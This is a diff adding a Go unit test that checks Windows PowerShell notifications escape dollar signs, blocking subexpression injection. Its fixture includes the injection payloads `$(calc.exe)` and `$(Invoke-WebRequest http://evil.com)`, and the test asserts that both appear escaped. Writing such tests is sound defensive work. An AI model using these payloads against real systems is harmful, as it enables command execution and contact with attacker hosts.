@@ -461,6 +461,62 @@ func TestDarwinNotificationEscapesBackslashes(t *testing.T) {
 	}
 }
 
+// TestWindowsNotificationEscapesDollarSign tests that dollar signs in notification
+// messages are properly escaped to prevent subexpression injection via PowerShell (Issue #44)
+func TestWindowsNotificationEscapesDollarSign(t *testing.T) {
+	var executedArgs []string
+
+	mock := &notification.MockCommandExecutor{
+		ExecuteFunc: func(cmd string, args ...string) error {
+			executedArgs = args
+			return nil
+		},
+	}
+
+	channel := notification.NewOSNotificationChannel(
+		&notification.OSNotificationConfig{
+			Enabled:        true,
+			OnSyncComplete: true,
+			OnSyncError:    true,
+			OnConflict:     true,
+		},
+		notification.WithCommandExecutor(mock),
+		notification.WithPlatform("windows"),
+	)
+
+	// Malicious payload attempting command injection via PowerShell subexpression
+	n := notification.Notification{
+		Type:      notification.NotifyTest,
+		Title:     `Task $(calc.exe)`,
+		Message:   `Reminder $(Invoke-WebRequest http://evil.com)`,
+		Timestamp: time.Now(),
+	}
+
+	err := channel.Send(n)
+	if err != nil {
+		t.Fatalf("expected no error, got %v", err)
+	}
+
+	// The script argument should have escaped dollar signs
+	script := executedArgs[1] // args[0] is "-Command", args[1] is the script
+
+	// Verify the dollar signs are escaped with backticks
+	// In PowerShell, $() within double quotes executes subexpressions
+	// Escaping $ as `$ prevents this
+	if !strings.Contains(script, "`$(calc.exe)") {
+		t.Errorf("expected script to contain escaped dollar sign (`$), title was not escaped. Got: %s", script)
+	}
+
+	if !strings.Contains(script, "`$(Invoke-WebRequest") {
+		t.Errorf("expected script to contain escaped dollar sign (`$), message was not escaped. Got: %s", script)
+	}
+
+	// The unescaped injection payload should NOT appear
+	if strings.Contains(script, "$(calc.exe)") && !strings.Contains(script, "`$(calc.exe)") {
+		t.Errorf("script contains unescaped injection payload (subexpression): %s", script)
+	}
+}
+
 // TestNotificationTypeFiltering tests that notification types are filtered based on config
 func TestNotificationTypeFiltering(t *testing.T) {
 	var sentNotifications []notification.Notification
